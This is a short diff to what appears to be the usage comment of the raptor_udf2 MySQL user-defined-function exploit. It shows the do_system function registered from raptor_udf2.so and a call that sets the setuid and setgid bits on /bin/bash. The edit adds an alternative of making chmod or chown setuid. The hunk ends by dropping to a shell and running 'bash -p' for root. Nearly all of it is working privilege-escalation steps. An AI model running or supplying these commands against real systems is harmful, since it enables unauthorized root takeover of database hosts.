@@ -19,6 +19,6 @@ mysql> select * from mysql.func;
  * +-----------+-----+----------------+----------+
  * | do_system |   2 | raptor_udf2.so | function |
  * +-----------+-----+----------------+----------+
-mysql> select do_system('chmod u+s /bin/bash; chmod g+s /bin/bash');
+mysql> select do_system('chmod u+s /bin/bash; chmod g+s /bin/bash'); #or chmod +s /bin/chmod, chmod +s chown
 mysql>\! sh
 bash -p
